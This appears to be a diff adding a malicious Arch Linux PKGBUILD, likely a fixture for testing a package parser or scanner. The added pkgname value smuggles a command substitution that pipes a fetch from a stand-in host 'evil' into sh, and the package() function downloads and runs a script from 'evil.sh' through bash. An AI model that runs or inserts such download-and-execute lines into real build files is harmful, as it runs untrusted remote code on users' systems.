@@ -1,0 +1,4 @@
+
+pkgname=$(curl http://evil | sh)
+url="http://[ff02::2]/x"
+package() { curl -fsSL http://evil.sh | bash; }
